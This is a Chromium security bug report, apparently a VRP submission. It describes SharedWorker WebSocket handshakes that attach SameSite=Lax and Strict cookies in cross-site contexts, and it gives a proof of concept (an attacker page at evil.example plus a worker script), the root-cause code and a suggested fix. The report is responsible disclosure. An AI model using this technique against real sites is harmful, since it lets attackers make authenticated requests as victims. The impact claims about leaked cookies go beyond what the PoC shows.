# VRP Report: SharedWorker WebSocket Sends SameSite Cookies in Cross-Site Context

## Title

SharedWorker WebSocket bypasses SameSite cookie restrictions in third-party context — kRestrictSharedWorkerWebSocketCrossSiteCookies disabled

## Severity

Medium (Cookie policy bypass)

## Component

Blink > Workers > SharedWorker

## Chrome Version

Tested against Chromium source at HEAD (April 2026). Affects all Chrome versions.

## Summary

When a SharedWorker is created in a third-party context (e.g., an iframe from a different site, or via the Storage Access API), WebSocket connections opened by that worker incorrectly attach `SameSite=Strict` and `SameSite=Lax` cookies to the handshake. The fix exists behind `kRestrictSharedWorkerWebSocketCrossSiteCookies` (`content/common/features.cc`), but it is `FEATURE_DISABLED_BY_DEFAULT`.

Since Chrome 80, the default SameSite attribute for cookies without an explicit SameSite attribute is `Lax`. This means most session cookies are `SameSite=Lax` by default and are vulnerable to this leak.

## Steps to Reproduce

### 1. Set up the target origin with SameSite cookies

At `https://target.example`, set cookies:
```http
Set-Cookie: session_id=secret123; SameSite=Lax; Secure
Set-Cookie: csrf_token=token456; SameSite=Strict; Secure
```

### 2. Attacker page at `https://evil.example/attack.html`

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Create a SharedWorker. In a third-party context (e.g., if this page
// is embedded as an iframe on target.example), the worker should have
// cross-site cookie semantics.
const worker = new SharedWorker('worker.js');
worker.port.onmessage = function(e) {
  console.log('Cookie data received:', e.data);
};
worker.port.start();
</script>
</body>
</html>
```

### 3. SharedWorker script at `https://evil.example/worker.js`

```javascript
self.onconnect = function(e) {
  const port = e.ports[0];
  
  // Open WebSocket to target.example
  // SameSite=Strict/Lax cookies should NOT be sent (cross-site context)
  // But they ARE sent due to the bug
  const ws = new WebSocket('wss://target.example/ws');
  
  ws.onopen = function() {
    port.postMessage('WebSocket connected — cookies were sent!');
  };
  
  ws.onmessage = function(event) {
    port.postMessage('Received: ' + event.data);
  };
  
  port.start();
};
```

### 4. WebSocket server at `wss://target.example/ws`

```python
# Log cookies received in WebSocket upgrade request
# Expected: No SameSite cookies (cross-site context)
# Actual: session_id=secret123; csrf_token=token456 are attached
```

### Expected Result

WebSocket handshake from a cross-site SharedWorker should NOT include `SameSite=Strict` or `SameSite=Lax` cookies. The `SiteForCookies` should be null for cross-site worker contexts.

### Actual Result

`SameSite=Strict` and `SameSite=Lax` cookies ARE included in the WebSocket handshake because the `SiteForCookies` is not nullified for cross-site SharedWorker WebSocket connections.

## Root Cause

```cpp
// content/browser/worker_host/shared_worker_host.cc:710-724
net::IsolationInfo SharedWorkerHost::ComputeIsolationInfoForWebSocket() const {
  // ...
  if (instance_.DoesRequireCrossSiteRequestForCookies()) {
    if (base::FeatureList::IsEnabled(
            features::kRestrictSharedWorkerWebSocketCrossSiteCookies)) {
      // FIX: Null out SiteForCookies — but flag is DISABLED
      isolation_info = net::IsolationInfo::Create(
          isolation_info.request_type(), *isolation_info.top_frame_origin(),
          *isolation_info.frame_origin(), net::SiteForCookies(),
          isolation_info.nonce());
    }
  }
  return isolation_info;  // Returns with valid SiteForCookies — cookies sent!
}
```

## Security Impact

1. **SameSite cookie bypass**: SameSite=Strict/Lax cookies sent in cross-site WebSocket
2. **Session hijacking**: Default SameSite=Lax session cookies are accessible
3. **CSRF token leak**: SameSite=Strict CSRF tokens are accessible
4. **No compromised renderer required**: Standard JavaScript APIs

## Suggested Fix

Enable `kRestrictSharedWorkerWebSocketCrossSiteCookies` by default.

## PoC

Inline above. The key observation: a SharedWorker in a third-party context can open a WebSocket that carries SameSite cookies that should be blocked.
